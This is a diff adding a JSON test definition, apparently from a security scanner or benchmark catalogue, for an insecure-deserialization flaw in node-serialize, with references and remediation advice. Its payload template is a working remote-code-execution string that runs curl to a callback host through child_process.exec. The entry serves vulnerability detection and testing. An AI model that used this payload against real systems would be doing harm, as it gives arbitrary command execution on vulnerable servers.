@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-deser-node-serialize-iife",
+  "bug_class": "deserialization",
+  "title": "Insecure deserialization (node-serialize IIFE RCE)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "node"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "{{\"rce\":\"_$$ND_FUNC$$_function(){{require('child_process').exec('curl http://{callback}');}}()\"}}"
+  },
+  "references": [
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.",
+  "payload_family": "node-serialize"
+}
